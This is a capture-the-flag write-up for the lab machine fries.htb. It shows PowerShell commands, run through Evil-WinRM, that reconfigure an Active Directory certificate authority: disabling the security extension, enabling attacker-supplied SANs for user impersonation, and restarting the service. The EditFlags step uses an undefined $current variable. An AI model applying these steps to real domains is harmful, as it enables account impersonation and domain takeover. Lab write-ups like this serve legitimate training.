# Lateral Movement - Phase 1
After identifying the `NFS` share on `web.local`, I mounted the `/srv/web.fries.htb` directory. Inspecting the mounted share, I noticed a `certs` directory owned by GID `59605603`, which my local user couldn't access.

# Compromise fries.htb
To bypass the restrictive CLI tools, I leveraged the `ICertAdmin` COM interface directly within PowerShell. This allowed me to modify the `CA`'s registry settings without needing full local administrator shell privileges, as long as the account had the `ManageCA` permission.
Initialized the COM interface.
```powershell
*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents> $CA = "DC01.fries.htb\fries-DC01-CA"
*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents> $CertAdmin = New-Object -ComObject CertificateAuthority.Admin
```
I modified the `DisableExtensionList` to include the OID `1.3.6.1.4.1.311.25.2` (`szOID_NTDS_CA_SECURITY_EXT`). This ensures the `CA` doesn't block or overwrite the security extensions we will later inject into our certificate request.
```powershell
*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents> $CertAdmin.SetConfigEntry($CA, "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy", "DisableExtensionList", "1.3.6.1.4.1.311.25.2")

*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents> certutil -config $CA -getreg policy\DisableExtensionList
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\fries-DC01-CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\DisableExtensionList:

  DisableExtensionList REG_SZ = 1.3.6.1.4.1.311.25.2
CertUtil: -getreg command completed successfully.
```
Setting the `EditFlags` to include `EDITF_ATTRIBUTESUBJECTALTNAME2` (`0x40000`) instructs the `CA` honor the `Subject Alternative Name (SAN)` attribute provided in the certificate request. This allows an attacker to request a certificate for User A while actually impersonating User B.
```powershell
*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents> $Value = 0x00040000
*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents> $newFlags = [Int32]($current -bor $Value)
*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents> $CertAdmin.SetConfigEntry($CA, "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy", "EditFlags", $newFlags)
```
Restarted the Certificate Service to commit the registry changes into the active memory.
```powershell
*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents> restart-service certsvc -Force
```
